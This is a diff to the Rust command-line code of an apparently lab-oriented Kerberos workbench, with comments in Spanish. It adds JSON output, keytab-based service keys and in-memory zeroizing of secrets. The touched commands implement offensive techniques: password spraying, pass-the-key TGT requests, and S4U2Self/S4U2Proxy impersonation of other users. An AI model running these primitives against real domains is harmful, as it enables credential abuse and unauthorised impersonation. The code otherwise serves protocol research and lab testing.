@@ -8,6 +8,7 @@ use clap::{Parser, Subcommand, ValueEnum};
 use owo_colors::OwoColorize;
 use charon_client::KdcConnection;
 use charon_kcrypto::{etype as etype_mod, KerberosKey};
+use zeroize::Zeroizing;
 
 /// Workbench del protocolo Kerberos: stack propio desde el wire format,
 /// primitivos ofensivos con control total de cada campo y decodificación
@@ -162,6 +163,9 @@ enum Command {
         /// Tras autenticar, muestra el trace completo del intercambio.
         #[arg(long)]
         trace: bool,
+        /// Salida en JSON (un objeto: user, key_etype, session_etype, endtime).
+        #[arg(long)]
+        json: bool,
     },
     /// Obtiene un TGT y muestra qué viajó por el cable.
     As {
@@ -198,6 +202,9 @@ enum Command {
         dc: String,
         #[arg(long, default_value_t = 88)]
         port: u16,
+        /// Salida en JSON (un objeto: crealm, cname, sname, flags, tiempos).
+        #[arg(long)]
+        json: bool,
     },
     /// Renovación de TGT (RFC 4120 §3.3.3). Dos caminos: con credenciales
     /// (--user/--realm) obtiene un TGT renovable y lo renueva; con
@@ -233,6 +240,9 @@ enum Command {
         /// Muestra el trace del TGS-REP de la renovación.
         #[arg(long)]
         trace: bool,
+        /// Salida en JSON (un objeto: modo, cname, sname, tiempos).
+        #[arg(long)]
+        json: bool,
     },
     /// Decodifica cualquier mensaje Kerberos capturado y lo explica campo a campo.
     Decode {
@@ -260,13 +270,25 @@ enum Command {
     },
     /// S4U2Self (MS-SFU): ticket para un usuario "en nombre de" otro,
     /// presentando el TGT del servicio. Útil para ver el PAC delegado.
+    /// La clave del servicio sale de --keytab (ktadd/ktutil) o de la
+    /// contraseña con su salt: fuentes exclusivas, como en `as`.
     S4u2self {
         /// El servicio que pide (dueño del TGT).
         #[arg(short, long)]
         user: String,
+        /// Contraseña del servicio (o --password-stdin; env:
+        /// CHARON_PASSWORD). Obligatoria solo si no hay --keytab.
         #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
-        password: String,
-        /// Salt AES del servicio.
+        password: Option<String>,
+        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
+        #[arg(long)]
+        password_stdin: bool,
+        /// Autentica el servicio con la clave de este keytab (formato
+        /// FILE v1/v2 de MIT): sin contraseña. --user elige la entrada;
+        /// el reino de la entrada debe coincidir.
+        #[arg(long)]
+        keytab: Option<String>,
+        /// Salt AES del servicio (solo en el camino de contraseña).
         #[arg(long)]
         salt: Option<String>,
         /// Usuario a suplantar.
@@ -278,6 +300,10 @@ enum Command {
         dc: String,
         #[arg(long, default_value_t = 88)]
         port: u16,
+        /// Salida en JSON (un objeto: service, impersonated, etype,
+        /// forwardable, pac_client o pac_error).
+        #[arg(long)]
+        json: bool,
     },
     /// S4U2Proxy (MS-SFU §2.2.3, primitivo de RBCD): con el TGT del
     /// servicio y el evidence ticket de S4U2Self, pide un ticket del
@@ -290,9 +316,18 @@ enum Command {
         /// El servicio que delega (dueño del TGT y del evidence ticket).
         #[arg(short, long)]
         user: String,
+        /// Contraseña del servicio que delega (o --password-stdin; env:
+        /// CHARON_PASSWORD). Obligatoria solo si no hay --keytab.
         #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
-        password: String,
-        /// Salt AES del servicio que delega.
+        password: Option<String>,
+        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
+        #[arg(long)]
+        password_stdin: bool,
+        /// Clave del servicio que DELEGA desde este keytab (FILE v1/v2
+        /// de MIT): sin contraseña. --user elige la entrada.
+        #[arg(long)]
+        keytab: Option<String>,
+        /// Salt AES del servicio que delega (solo camino de contraseña).
         #[arg(long)]
         salt: Option<String>,
         /// Usuario a suplantar.
@@ -305,12 +340,22 @@ enum Command {
         /// final y demostrar el PAC del usuario suplantado.
         #[arg(long)]
         to_password: Option<String>,
+        /// Keytab del servicio destino (FILE v1/v2 de MIT): alternativa
+        /// a --to-password para descifrar el ticket final — la única vía
+        /// con KDBs sin contraseñas (LDAP/test) o cuentas de máquina.
+        /// Exclusivo con --to-password.
+        #[arg(long)]
+        to_keytab: Option<String>,
         #[arg(short, long)]
         realm: String,
         #[arg(long, default_value = "127.0.0.1")]
         dc: String,
         #[arg(long, default_value_t = 88)]
         port: u16,
+        /// Salida en JSON (un objeto: service, impersonated, target,
+        /// ticket_etype, pac_client o pac_error).
+        #[arg(long)]
+        json: bool,
     },
     /// Ejecuta la matriz de comportamiento KDC y escribe el dataset JSON.
     Matrix {
@@ -418,7 +463,7 @@ fn run(cli: Cli) -> Result<(), String> {
             if spn.is_empty() {
                 return fail("--spn vacío".into());
             }
-            let password = resolve_password(password, password_stdin)?;
+            let password = resolve_password(password.map(Zeroizing::new), password_stdin)?;
             let c = conn(&dc, port);
             // 1) aprender el salt si no viene: AS-REQ sin preauth del usuario.
             let salt = match salt {
@@ -526,15 +571,15 @@ fn run(cli: Cli) -> Result<(), String> {
                 if list.is_empty() {
                     return fail("--users vacío: pasa usuarios separados por coma o @fichero".into());
                 }
-                let password = resolve_password(password, password_stdin)?;
-                list.into_iter().map(|u| (u, password.clone())).collect()
+                let password = resolve_password(password.map(Zeroizing::new), password_stdin)?;
+                list.into_iter().map(|u| (u, (*password).clone())).collect()
             });
             if targets.is_empty() {
                 return fail("no hay objetivos de spray".into());
             }
             let c = conn(&dc, port);
             let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::AES128_CTS_HMAC_SHA1_96];
-            let mut hits = Vec::new();
+            let mut hits = Hits::default();
             let mut rows = Vec::new();
             for (i, (u, pw)) in targets.iter().enumerate() {
                 if i > 0 && delay_ms > 0 {
@@ -578,7 +623,7 @@ fn run(cli: Cli) -> Result<(), String> {
             Ok(())
         }
 
-        Command::Passthekey { user, realm, nt_hash, aes_key, dc, port, trace } => {
+        Command::Passthekey { user, realm, nt_hash, aes_key, dc, port, trace, json } => {
             let c = conn(&dc, port);
             let (key, salt_used) = if let Some(h) = &nt_hash {
                 let bytes = decode_hex(h)?;
@@ -605,6 +650,21 @@ fn run(cli: Cli) -> Result<(), String> {
             };
             let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &etypes, 0)
                 .map_err(|e| format!("pass-the-key rechazado por el KDC: {e}"))?;
+            if json {
+                println!(
+                    "{}",
+                    serde_json::json!({
+                        "command": "passthekey",
+                        "user": user,
+                        "realm": realm,
+                        "key_etype": key.etype(),
+                        "key_etype_name": etype_name(key.etype()),
+                        "session_etype": tgt.session_key.keytype,
+                        "endtime": tgt.endtime.to_string(),
+                    })
+                );
+                return Ok(());
+            }
             println!(
                 "{} TGT obtenido para {} usando la clave directamente ({}).",
                 "pass-the-key:".bold(),
@@ -619,7 +679,7 @@ fn run(cli: Cli) -> Result<(), String> {
             Ok(())
         }
 
-        Command::As { user, password, password_stdin, realm, salt, etype, renewable, ccache, keytab, dc, port } => {
+        Command::As { user, password, password_stdin, realm, salt, etype, renewable, ccache, keytab, dc, port, json } => {
             let c = conn(&dc, port);
             // Fuente de clave exclusiva: keytab (claves exportadas por
             // ktadd/ktutil) o contraseña con su salt. Con keytab no hay
@@ -643,10 +703,10 @@ fn run(cli: Cli) -> Result<(), String> {
                 (
                     kt_key,
                     etypes,
-                    format!("keytab {} (kvno {}, {})", kt_path.yellow(), kt_kvno, etype_name(kt_enctype)),
+                    format!("keytab {kt_path} (kvno {kt_kvno}, {})", etype_name(kt_enctype)),
                 )
             } else {
-                let password = resolve_password(password, password_stdin)?;
+                let password = resolve_password(password.map(Zeroizing::new), password_stdin)?;
                 let salt = match salt {
                     Some(s) => s,
                     None => learn_salt(&c, &user, &realm)?,
@@ -670,6 +730,24 @@ fn run(cli: Cli) -> Result<(), String> {
             } else {
                 String::new()
             };
+            if json {
+                println!(
+                    "{}",
+                    serde_json::json!({
+                        "command": "as",
+                        "crealm": tgt.crealm,
+                        "cname": tgt.cname,
+                        "sname": tgt.ticket.sname.flat(),
+                        "session_etype": tgt.session_key.keytype,
+                        "flags": ticket_flag_names(tgt.flags),
+                        "authtime": tgt.authtime.to_string(),
+                        "endtime": tgt.endtime.to_string(),
+                        "renew_till": tgt.renew_till.map(|t| t.to_string()),
+                        "key_source": key_source,
+                    })
+                );
+                return Ok(());
+            }
             println!(
                 "{} TGT {} → {}, sesión etype {}, caduca {}{}",
                 "AS:".bold(),
@@ -694,7 +772,7 @@ fn run(cli: Cli) -> Result<(), String> {
             Ok(())
         }
 
-        Command::Renew { user, password, password_stdin, realm, salt, renew_hours, ccache, dc, port, trace } => {
+        Command::Renew { user, password, password_stdin, realm, salt, renew_hours, ccache, dc, port, trace, json } => {
             let c = conn(&dc, port);
             // Dos caminos exclusivos: ccache (sin credenciales) o AS completo.
             if let Some(path) = &ccache {
@@ -734,6 +812,29 @@ fn run(cli: Cli) -> Result<(), String> {
                 );
                 let renewed = charon_client::renew_tgt(&c, &tgt, till)
                     .map_err(|e| format!("renovación rechazada por el KDC: {e}"))?;
+                // Reescribe el fichero con el TGT renovado (lo que hace
+                // `kinit -R -c`): la próxima renovación parte del nuevo.
+                // ANTES de la salida JSON: renovar sin persistir dejaría
+                // el ccache con el TGT viejo y la promesa del JSON rota.
+                charon_client::ccache::save_tgt(path, &renewed)
+                    .map_err(|e| format!("no pude actualizar el ccache {path}: {e}"))?;
+                if json {
+                    println!(
+                        "{}",
+                        serde_json::json!({
+                            "command": "renew",
+                            "mode": "ccache",
+                            "cname": format!("{}@{}", tgt.cname, tgt.crealm),
+                            "sname": tgt.ticket.sname.flat(),
+                            "session_etype": renewed.session_key.keytype,
+                            "authtime": renewed.authtime.to_string(),
+                            "endtime": renewed.endtime.to_string(),
+                            "renew_till": renewed.renew_till.map(|t| t.to_string()),
+                            "file_updated": true,
+                        })
+                    );
+                    return Ok(());
+                }
                 println!(
                     "{} renovado → caduca {} (authtime conservada: {}, nueva clave de sesión etype {})",
                     "  ↳".green(),
@@ -741,10 +842,6 @@ fn run(cli: Cli) -> Result<(), String> {
                     renewed.authtime,
                     renewed.session_key.keytype
                 );
-                // Reescribe el fichero con el TGT renovado (lo que hace
-                // `kinit -R -c`): la próxima renovación parte del nuevo.
-                charon_client::ccache::save_tgt(path, &renewed)
-                    .map_err(|e| format!("no pude actualizar el ccache {path}: {e}"))?;
                 println!(
                     "{} fichero actualizado con el TGT renovado",
                     "ccache:".bold()
@@ -765,7 +862,7 @@ fn run(cli: Cli) -> Result<(), String> {
             let realm = realm.ok_or_else(|| {
                 "falta --realm (o usa --ccache para renovar un TGT persistido)".to_string()
             })?;
-            let password = resolve_password(password, password_stdin)?;
+            let password = resolve_password(password.map(Zeroizing::new), password_stdin)?;
             let salt = match salt {
                 Some(s) => s,
                 None => learn_salt(&c, &user, &realm)?,
@@ -792,6 +889,22 @@ fn run(cli: Cli) -> Result<(), String> {
             );
             let renewed = charon_client::renew_tgt(&c, &tgt, till)
                 .map_err(|e| format!("renovación rechazada por el KDC: {e}"))?;
+            if json {
+                println!(
+                    "{}",
+                    serde_json::json!({
+                        "command": "renew",
+                        "mode": "credentials",
+                        "cname": format!("{user}@{realm}"),
+                        "sname": renewed.ticket.sname.flat(),
+                        "session_etype": renewed.session_key.keytype,
+                        "authtime": renewed.authtime.to_string(),
+                        "endtime": renewed.endtime.to_string(),
+                        "renew_till": renewed.renew_till.map(|t| t.to_string()),
+                    })
+                );
+                return Ok(());
+            }
             println!(
                 "{} renovado → caduca {} (authtime conservada: {}, nueva clave de sesión etype {})",
                 "  ↳".green(),
@@ -812,7 +925,7 @@ fn run(cli: Cli) -> Result<(), String> {
 
         Command::Decode { file, password, password_stdin, nt_hash, realm, user, usage, json } => {
             let bytes = std::fs::read(&file).map_err(|e| format!("no pude leer {file}: {e}"))?;
-            let password = if password_stdin { Some(resolve_password(password, true)?) } else { password };
+            let password = if password_stdin { Some(resolve_password(None, true)?) } else { password.map(Zeroizing::new) };
             let key = if let Some(h) = &nt_hash {
                 let b = decode_hex(h)?;
                 Some(KerberosKey::from_raw(etype_mod::RC4_HMAC, &b).map_err(|e| e.to_string())?)
@@ -842,17 +955,124 @@ fn run(cli: Cli) -> Result<(), String> {
             Ok(())
         }
 
-        Command::S4u2self { user, password, salt, impersonate, realm, dc, port } => {
+        Command::S4u2self { user, password, password_stdin, keytab, salt, impersonate, realm, dc, port, json } => {
             let c = conn(&dc, port);
-            let salt = match salt {
-                Some(s) => s,
-                None => learn_salt(&c, &user, &realm)?,
+            // Fuente de clave exclusiva (mismo criterio que `as`): keytab
+            // o contraseña. El salt solo interviene en el camino de
+            // contraseña; con keytab la clave ya trae su salt cocido.
+            if keytab.is_some() && (password.is_some() || password_stdin || salt.is_some()) {
+                return fail(
+                    "--keytab es incompatible con --password/--password-stdin/--salt: \
+                     la clave del servicio sale del fichero (el salt ya está cocido en ella)"
+                        .into(),
+                );
+            }
+            if keytab.is_none() && password.is_none() && !password_stdin {
+                return fail(
+                    "falta la fuente de clave del servicio: --keytab o --password/--password-stdin".into(),
+                );
+            }
+            let keys = match &keytab {
+                Some(p) => keys_from_keytab(p, &user, &realm)?,
+                None => Vec::new(),
             };
-            let key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
-            let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &[etype_mod::AES256_CTS_HMAC_SHA1_96], 0)
+            let key_source: String;
+            let key: KerberosKey;
+            let password_held: Option<Zeroizing<String>>;
+            if let Some(kt_path) = &keytab {
+                let (k, kvno, enctype) = pick_keytab_key(&keys, &user)?;
+                key = k;
+                key_source =
+                    format!("keytab {kt_path} (kvno {kvno}, {})", etype_name(enctype));
+                password_held = None;
+            } else {
+                let pw = resolve_password(password.map(Zeroizing::new), password_stdin)?;
+                let salt = match salt {
+                    Some(s) => s,
+                    None => learn_salt(&c, &user, &realm)?,
+                };
+                key = key_from_credentials(&user, &realm, &salt, &pw, None, None)?;
+                key_source = "contraseña".to_string();
+                password_held = Some(pw);
+            }
+            // El etype de la petición se adapta a la clave: con clave RC4 se
+            // pide también 18 (MIT 1.21 exige etype de sesión no deprecado).
+            let req_etypes = if key.etype() == etype_mod::RC4_HMAC {
+                vec![etype_mod::RC4_HMAC, etype_mod::AES256_CTS_HMAC_SHA1_96]
+            } else {
+                vec![key.etype()]
+            };
+            let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &req_etypes, 0)
                 .map_err(|e| format!("no se pudo obtener el TGT: {e}"))?;
             let st = charon_client::s4u2self(&c, &tgt, &user, &impersonate, &realm)
                 .map_err(|e| format!("S4U2Self rechazado: {e}"))?;
+            // El ticket va cifrado con la clave larga del servicio: al
+            // descifrarlo, el PAC muestra la identidad suplantada.
+            // El KDC ELIGE el etype del ticket: con cuentas que tienen RC4
+            // puede emitirlo en 23 aunque el analista haya derivado AES256
+            // (lección del lab: jdoe con arcfour restaurado → ticket S4U en
+            // RC4). La clave de descifrado se elige según el etype REAL del
+            // ticket: en el camino keytab se BUSCA la entrada de ese etype
+            // (ktadd exporta todas las que la cuenta tiene); con contraseña
+            // se deriva la RC4 si hace falta, como hacen impacket/Rubeus.
+            let pac_key: KerberosKey = if st.ticket.enc_part.etype == key.etype() {
+                key
+            } else if let Some(entry) = keys.iter().find(|k| k.2 == st.ticket.enc_part.etype) {
+                entry.0.clone()
+            } else if st.ticket.enc_part.etype == etype_mod::RC4_HMAC && keytab.is_none() {
+                // Camino contraseña: la RC4 no depende del salt (MD4 de la
+                // contraseña), así que se deriva directa de la retenida.
+                KerberosKey::from_password(
+                    password_held.as_deref().ok_or("sin contraseña retenida para derivar RC4")?,
+                    "",
+                    etype_mod::RC4_HMAC,
+                )
+                .map_err(|e| format!("no pude derivar la clave RC4 del servicio: {e}"))?
+            } else {
+                let have = if keys.is_empty() {
+                    "modo contraseña".to_string()
+                } else {
+                    keys.iter().map(|k| etype_name(k.2)).collect::<Vec<_>>().join(", ")
+                };
+                return fail(format!(
+                    "el ticket S4U llegó en {} pero no hay clave de ese etype para {user} \
+                     (disponible: {have}). Vuelve a exportar con `ktadd -norandkey {user}` \
+                     para traer todas las enctypes de la cuenta.",
+                    etype_name(st.ticket.enc_part.etype)
+                ));
+            };
+            let (pac_client, pac_error) = match charon_krb5::pac::extract_pac(&st.ticket, &pac_key) {
+                Ok(pac) => match pac.client_info() {
+                    Some((_, name)) => (Some(name), None),
+                    None => (
+                        None,
+                        Some(format!(
+                            "PAC sin CLIENT INFO (buffers: {:?})",
+                            pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()
+                        )),
+                    ),
+                },
+                Err(e) => (None, Some(e.to_string())),
+            };
+            let forwardable = st.flags & charon_krb5::ticket_flags::FORWARDABLE != 0;
+            if json {
+                println!(
+                    "{}",
+                    serde_json::json!({
+                        "command": "s4u2self",
+                        "service": format!("{user}@{realm}"),
+                        "impersonated": impersonate,
+                        "ticket_sname": st.ticket.sname.flat(),
+                        "ticket_etype": st.ticket.enc_part.etype,
+                        "ticket_etype_name": etype_name(st.ticket.enc_part.etype),
+                        "forwardable": forwardable,
+                        "pac_client": pac_client,
+                        "pac_error": pac_error,
+                        "key_source": key_source,
+                    })
+                );
+                return Ok(());
+            }
             println!(
                 "{} ticket para {} en nombre de {} (etype {})",
                 "s4u2self:".bold(),
@@ -860,51 +1080,72 @@ fn run(cli: Cli) -> Result<(), String> {
                 impersonate.yellow(),
                 st.ticket.enc_part.etype
             );
-            // El ticket va cifrado con la clave larga del servicio: al
-            // descifrarlo, el PAC muestra la identidad suplantada.
-            // El KDC ELIGE el etype del ticket: con cuentas que tienen RC4
-            // puede emitirlo en 23 aunque el analista haya derivado AES256
-            // (lección del lab: jdoe con arcfour restaurado → ticket S4U en
-            // RC4). La clave de descifrado se elige según el etype REAL del
-            // ticket, como hacen impacket/Rubeus.
-            let pac_key = if st.ticket.enc_part.etype == etype_mod::RC4_HMAC
-                && key.etype() != etype_mod::RC4_HMAC
-            {
-                KerberosKey::from_password(&password, &salt, etype_mod::RC4_HMAC)
-                    .map_err(|e| format!("no pude derivar la clave RC4 del servicio: {e}"))?
-            } else {
-                key
-            };
-            match charon_krb5::pac::extract_pac(&st.ticket, &pac_key) {
-                Ok(pac) => match pac.client_info() {
-                    Some((_, name)) => println!("  PAC CLIENT INFO: {}", name.green()),
-                    None => println!("  PAC buffers: {:?}", pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()),
-                },
-                Err(e) => println!("  PAC: {e}"),
+            println!("  {} clave del servicio desde {}", "·".dimmed(), key_source.dimmed());
+            match (pac_client, pac_error) {
+                (Some(name), _) => println!("  PAC CLIENT INFO: {}", name.green()),
+                (None, Some(e)) => println!("  PAC: {e}"),
+                (None, None) => {}
             }
             Ok(())
         }
 
-        Command::S4u2proxy { user, password, salt, impersonate, to, to_password, realm, dc, port } => {
+        Command::S4u2proxy { user, password, password_stdin, keytab, salt, impersonate, to, to_password, to_keytab, realm, dc, port, json } => {
             let c = conn(&dc, port);
-            let salt = match salt {
-                Some(s) => s,
-                None => learn_salt(&c, &user, &realm)?,
+            // Fuente de clave exclusiva para el servicio que DELEGA (mismo
+            // criterio que `as` y `s4u2self`). --to-password es indepen-
+            // diente: es la clave del servicio DESTINO, solo para demostrar
+            // el PAC del ticket final.
+            if keytab.is_some() && (password.is_some() || password_stdin || salt.is_some()) {
+                return fail(
+                    "--keytab es incompatible con --password/--password-stdin/--salt: \
+                     la clave del servicio que delega sale del fichero"
+                        .into(),
+                );
+            }
+            if keytab.is_none() && password.is_none() && !password_stdin {
+                return fail(format!(
+                    "falta la fuente de clave de {user}: --keytab o --password/--password-stdin"
+                ));
+            }
+            let keys = match &keytab {
+                Some(p) => keys_from_keytab(p, &user, &realm)?,
+                None => Vec::new(),
             };
-            let key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
+            let key_source: String;
+            let key: KerberosKey;
+            if let Some(kt_path) = &keytab {
+                let (k, kvno, enctype) = pick_keytab_key(&keys, &user)?;
+                key = k;
+                key_source =
+                    format!("keytab {kt_path} (kvno {kvno}, {})", etype_name(enctype));
+            } else {
+                let pw = resolve_password(password.map(Zeroizing::new), password_stdin)?;
+                let salt = match salt {
+                    Some(s) => s,
+                    None => learn_salt(&c, &user, &realm)?,
+                };
+                key = key_from_credentials(&user, &realm, &salt, &pw, None, None)?;
+                key_source = "contraseña".to_string();
+            }
             // 1) TGT del servicio que delega. Lección del lab verificada
             // contra kdc_util.c de MIT 1.21 (get_ticket_flags, líneas
             // 843-844): MIT recorta FORWARDABLE del ticket emitido si el
             // TGT cabecera no lo lleva — las opciones del TGS-REQ no
             // pueden AÑADIR el flag, solo heredarse. Por eso el TGT del
             // servicio se pide FORWARDABLE (lo que kinit hace por
-            // defecto con forwardable=true).
+            // defecto con forwardable=true). El etype se adapta a la
+            // clave (con RC4, pedir también 18: lección de passthekey).
+            let req_etypes = if key.etype() == etype_mod::RC4_HMAC {
+                vec![etype_mod::RC4_HMAC, etype_mod::AES256_CTS_HMAC_SHA1_96]
+            } else {
+                vec![key.etype()]
+            };
             let tgt = charon_client::request_tgt(
                 &c,
                 &user,
                 &realm,
                 &key,
-                &[etype_mod::AES256_CTS_HMAC_SHA1_96],
+                &req_etypes,
                 charon_krb5::kdc_options::FORWARDABLE,
             )
             .map_err(|e| format!("no se pudo obtener el TGT de {user}: {e}"))?;
@@ -913,22 +1154,25 @@ fn run(cli: Cli) -> Result<(), String> {
             let evidence = charon_client::s4u2self(&c, &tgt, &user, &impersonate, &realm)
                 .map_err(|e| format!("S4U2Self rechazado: {e}"))?;
             let forwardable = evidence.flags & charon_krb5::ticket_flags::FORWARDABLE != 0;
-            println!(
-                "{} evidence ticket {} → {} (etype {}, forwardable: {})",
-                "s4u2self:".bold(),
-                evidence.ticket.sname.flat().cyan(),
-                impersonate.yellow(),
-                evidence.ticket.enc_part.etype,
-                if forwardable {
-                    "sí".green().to_string()
-                } else {
-                    "NO".red().to_string()
-                }
-            );
+            if !json {
+                println!(
+                    "{} evidence ticket {} → {} (etype {}, forwardable: {})",
+                    "s4u2self:".bold(),
+                    evidence.ticket.sname.flat().cyan(),
+                    impersonate.yellow(),
+                    evidence.ticket.enc_part.etype,
+                    if forwardable {
+                        "sí".green().to_string()
+                    } else {
+                        "NO".red().to_string()
+                    }
+                );
+            }
             if !forwardable {
                 return fail(format!(
                     "el evidence ticket NO es forwardable: el KDC no concedió la delegación. \
-                     ¿Tiene {user} el atributo ok_to_auth_as_delegate? (scripts/lab_setup_delegation.sh)"
+                     ¿Tiene {user} el atributo ok_to_auth_as_delegate? (scripts/lab_setup_delegation.sh \
+                     o el KDC test-KDB del lab, lab/setup-test-kdb.sh)"
                 ));
             }
             // 3) S4U2Proxy: ticket del usuario hacia el servicio destino.
@@ -950,26 +1194,54 @@ fn run(cli: Cli) -> Result<(), String> {
                          MIT con backend db2 NO puede autorizar ninguna delegación \
                          (la política vive en el KDB: solo LDAP o el módulo test de \
                          MIT implementan allowed_to_delegate — ver informe de ronda y \
-                         docs/threat-model.md). La petición S4U2Proxy de Charon es \
-                         correcta: el KDC la reconoció y la llevó a evaluación de \
-                         política. Detalle: {msg}"
+                         docs/threat-model.md; el lab trae un segundo KDC test-KDB con \
+                         tabla de delegación en lab/setup-test-kdb.sh). Detalle: {msg}"
                     ));
                 }
                 Err(e) => return Err(format!("S4U2Proxy rechazado: {e}")),
             };
-            println!(
-                "{} ticket delegado: cliente {}, destino {} (etype {})",
-                "s4u2proxy:".bold(),
-                final_st.cname.green(),
-                final_st.ticket.sname.flat().cyan(),
-                final_st.ticket.enc_part.etype
-            );
             // 4) Prueba de la delegación: el ticket final va cifrado con la
             // clave larga del servicio DESTINO. Descifrándolo con ella, el
             // PAC muestra al usuario suplantado — sin que el usuario haya
-            // participado. Mismo criterio que en s4u2self: el KDC elige el
-            // etype del ticket y la clave se adapta.
-            if let Some(dbpass) = &to_password {
+            // participado. La clave del destino sale de --to-keytab (la
+            // única vía con KDBs sin contraseñas: cuentas de máquina,
+            // LDAP o el módulo test del lab) o se deriva de --to-password.
+            // En ambos casos la clave se elige por el etype REAL del ticket.
+            if to_password.is_some() && to_keytab.is_some() {
+                return fail(
+                    "--to-keytab es incompatible con --to-password: una sola fuente \
+                     para la clave del servicio destino"
+                        .into(),
+                );
+            }
+            let to_password = to_password.map(Zeroizing::new);
+            let (pac_client, pac_error) = if let Some(kt_path) = &to_keytab {
+                let dest_keys = keys_from_keytab(kt_path, &to, &realm)?;
+                match dest_keys.iter().find(|k| k.2 == final_st.ticket.enc_part.etype) {
+                    Some(entry) => match charon_krb5::pac::extract_pac(&final_st.ticket, &entry.0) {
+                        Ok(pac) => match pac.client_info() {
+                            Some((_, name)) => (Some(name), None),
+                            None => (
+                                None,
+                                Some(format!(
+                                    "PAC sin CLIENT INFO (buffers: {:?})",
+                                    pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()
+                                )),
+                            ),
+                        },
+                        Err(e) => (None, Some(e.to_string())),
+                    },
+                    None => (
+                        None,
+                        Some(format!(
+                            "el keytab de {to} no trae clave en {} (entradas: {}). \
+                             Exporta todas las enctypes con ktadd -norandkey",
+                            etype_name(final_st.ticket.enc_part.etype),
+                            dest_keys.iter().map(|k| etype_name(k.2)).collect::<Vec<_>>().join(", ")
+                        )),
+                    ),
+                }
+            } else if let Some(dbpass) = &to_password {
                 let db_salt = learn_salt(&c, &to, &realm)?;
                 let db_key = if final_st.ticket.enc_part.etype == etype_mod::RC4_HMAC {
                     KerberosKey::from_password(dbpass, &db_salt, etype_mod::RC4_HMAC)
@@ -979,19 +1251,59 @@ fn run(cli: Cli) -> Result<(), String> {
                 .map_err(|e| format!("no pude derivar la clave de {to}: {e}"))?;
                 match charon_krb5::pac::extract_pac(&final_st.ticket, &db_key) {
                     Ok(pac) => match pac.client_info() {
-                        Some((_, name)) => println!(
-                            "  PAC CLIENT INFO del ticket delegado: {} {}",
-                            name.green(),
-                            format!("(delegado por {user}, no por {impersonate})").dimmed()
+                        Some((_, name)) => (Some(name), None),
+                        None => (
+                            None,
+                            Some(format!(
+                                "PAC sin CLIENT INFO (buffers: {:?})",
+                                pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()
+                            )),
                         ),
-                        None => println!("  PAC buffers: {:?}", pac.buffers.iter().map(|b| b.buffer_type).collect::<Vec<_>>()),
                     },
-                    Err(e) => println!("  PAC: {e}"),
+                    Err(e) => (None, Some(e.to_string())),
                 }
             } else {
+                (None, None)
+            };
+            if json {
                 println!(
-                    "  (sin --to-password no se descifra el ticket final; añádela para ver el PAC del suplantado)"
+                    "{}",
+                    serde_json::json!({
+                        "command": "s4u2proxy",
+                        "service": format!("{user}@{realm}"),
+                        "impersonated": impersonate,
+                        "target": to,
+                        "evidence_forwardable": forwardable,
+                        "ticket_cname": final_st.cname,
+                        "ticket_sname": final_st.ticket.sname.flat(),
+                        "ticket_etype": final_st.ticket.enc_part.etype,
+                        "ticket_etype_name": etype_name(final_st.ticket.enc_part.etype),
+                        "pac_client": pac_client,
+                        "pac_error": pac_error,
+                        "key_source": key_source,
+                    })
                 );
+                return Ok(());
+            }
+            println!(
+                "{} ticket delegado: cliente {}, destino {} (etype {})",
+                "s4u2proxy:".bold(),
+                final_st.cname.green(),
+                final_st.ticket.sname.flat().cyan(),
+                final_st.ticket.enc_part.etype
+            );
+            match (pac_client, pac_error) {
+                (Some(name), _) => println!(
+                    "  PAC CLIENT INFO del ticket delegado: {} {}",
+                    name.green(),
+                    format!("(delegado por {user}, no por {impersonate})").dimmed()
+                ),
+                (None, Some(e)) => println!("  PAC: {e}"),
+                (None, None) => {
+                    println!(
+                        "  (sin --to-password no se descifra el ticket final; añádela para ver el PAC del suplantado)"
+                    );
+                }
             }
             Ok(())
         }
@@ -1141,6 +1453,38 @@ impl Drop for SprayPairs {
     }
 }
 
+/// Aciertos del spray (`usuario<TAB>contraseña`): son secretos EN CLARO
+/// vivos en memoria durante todo el comando — y cada `format!` del bucle
+/// es una copia más que sobrevive al scope del par que la originó. El
+/// contenedor ceroiza cada línea al soltar (la copia intencional que
+/// queda es la del fichero de `--output`, que el analista pide y debe
+/// proteger él). Cierre del ciclo de vida que quedó pendiente en la
+/// Ronda 2 junto con el de SprayPairs.
+#[derive(Default)]
+struct Hits(Vec<String>);
+
+impl std::ops::Deref for Hits {
+    type Target = Vec<String>;
+    fn deref(&self) -> &Self::Target {
+        &self.0
+    }
+}
+
+impl std::ops::DerefMut for Hits {
+    fn deref_mut(&mut self) -> &mut Self::Target {
+        &mut self.0
+    }
+}
+
+impl Drop for Hits {
+    fn drop(&mut self) {
+        use zeroize::Zeroize;
+        for line in self.0.iter_mut() {
+            line.zeroize();
+        }
+    }
+}
+
 /// Carga un fichero de pares `usuario:contraseña` (uno por línea) para
 /// el spray por pares. Se acepta ruta directa o "@ruta" (misma forma
 /// que --users). Reglas: '#' comenta la línea; la contraseña puede
@@ -1177,7 +1521,14 @@ fn resolve_pairs(spec: &str) -> Result<Vec<(String, String)>, String> {
 /// Contraseña desde argv/env o desde stdin (`--password-stdin`): la vía
 /// stdin evita que el secreto quede visible en `ps` y en el history del
 /// shell. argv se mantiene por comodidad en el lab.
-fn resolve_password(password: Option<String>, stdin: bool) -> Result<String, String> {
+///
+/// El tipo de retorno es `Zeroizing<String>` y el argumento también: el
+/// String del argv/env se MUEVE dentro del envoltorio sin copias y se
+/// ceroiza al soltar (igual que la copia de stdin — incluido el buffer
+/// de línea, que retiene el secreto con el salto). Así ninguna ruta deja
+/// contraseñas en memoria liberada, deuda abierta desde la Ronda 2.
+fn resolve_password(password: Option<Zeroizing<String>>, stdin: bool) -> Result<Zeroizing<String>, String> {
+    use zeroize::Zeroize;
     if stdin {
         let mut buf = String::new();
         std::io::stdin()
@@ -1185,10 +1536,11 @@ fn resolve_password(password: Option<String>, stdin: bool) -> Result<String, Str
             .read_line(&mut buf)
